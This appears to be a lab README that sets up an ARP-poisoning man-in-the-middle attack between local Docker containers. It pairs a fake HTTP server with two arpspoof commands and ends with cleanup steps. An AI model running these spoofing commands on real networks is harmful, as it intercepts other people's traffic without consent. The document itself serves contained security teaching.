# ARP Poisoning MITM using Docker containers 

## 1. Start the Containers

```bash
(sudo) docker compose up
```

---

## 2. Identify the Docker Bridge Interface

```bash
sudo ifconfig (net-tools should be installed)

--OR--

ip -o link show | grep br- | awk -F: '{print $2}'
```
Example: `br-7e3d198083c3`.

---

## 3. Add Server IP Alias

```bash
sudo ip addr add 192.168.90.100/32 dev br-7e3d198083c3
```

---

## 4. Launch the Fake HTTP Server

Make the script executable and start it in the background:

```bash
sudo python3 fakeserver.py
```

---

## 5. Start ARP Poisoning

Run two `arpspoof` processes:

```bash
sudo arpspoof -i br-7e3d198083c3 -t 192.168.90.101 192.168.90.100 
sudo arpspoof -i br-7e3d198083c3 -t 192.168.90.100 192.168.90.101 
```

---

## 6. Cleanup

1. Stop arpspoof:
   ```bash
   sudo pkill arpspoof
   ```
2. Remove the IP alias:
   ```bash
   sudo ip addr del 192.168.90.100/32 dev br-7e3d198083c3
   ```